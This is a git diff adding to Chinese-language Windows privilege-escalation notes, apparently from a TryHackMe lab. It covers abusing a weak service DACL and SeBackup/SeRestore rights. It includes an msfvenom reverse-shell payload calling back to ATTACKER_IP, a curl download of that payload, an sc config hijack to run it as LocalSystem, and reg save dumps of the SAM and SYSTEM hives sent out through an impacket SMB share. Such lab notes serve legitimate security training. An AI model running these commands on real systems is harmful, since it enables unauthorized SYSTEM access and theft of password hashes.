@@ -170,9 +170,73 @@ BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
 
 ## 不安全的服务权限
 
+如果服务的可执行文件的DACL（权限）没有问题，并且路径也没啥问题
+
+可以检查一下**服务本身的DACL（权限）**
+
+要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的[Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) 。
+```shell
+accesschk64.exe -qlc thmservice
+```
+![Pasted image 20241123144759.png](/img/user/picture/Pasted%20image%2020241123144759.png)
+可以看到任何用户都有SERVICE_ALL_ACCESS权限，都可以重新配置服务
+
+下面构建另一个 exe-service 反向 shell
+```shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+
+python3 -m http.server 
 
 
+nc -lvnp 4447
+```
 
+
+```shell
+curl http://ATTACKER_IP:8000/rev-svc3.exe -O rev-svc3.exe
+
+
+icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
+
+sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+
+
+# 滥用特权
+
+## windows特权
+查看特权：
+```shell-session
+whoami /priv
+```
+
+https://github.com/gtworek/Priv2Admin
+这个项目列举了一些对于攻击者有用的特权
+
+
+## SeBackup / SeRestore
+
+SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何DACL 。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。
+
+有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。
+
+注意（管理员身份启动）
+![Pasted image 20241123155912.png](/img/user/picture/Pasted%20image%2020241123155912.png)
+
+要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：
+```shell
+C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+The operation completed successfully.
+
+C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+The operation completed successfully.
+```
+这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的`smbserver.py`在 AttackBox 的当前目录中启动一个带有网络共享的简单SMB服务器：
+```shell
+mkdir share
+
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
 
 
 
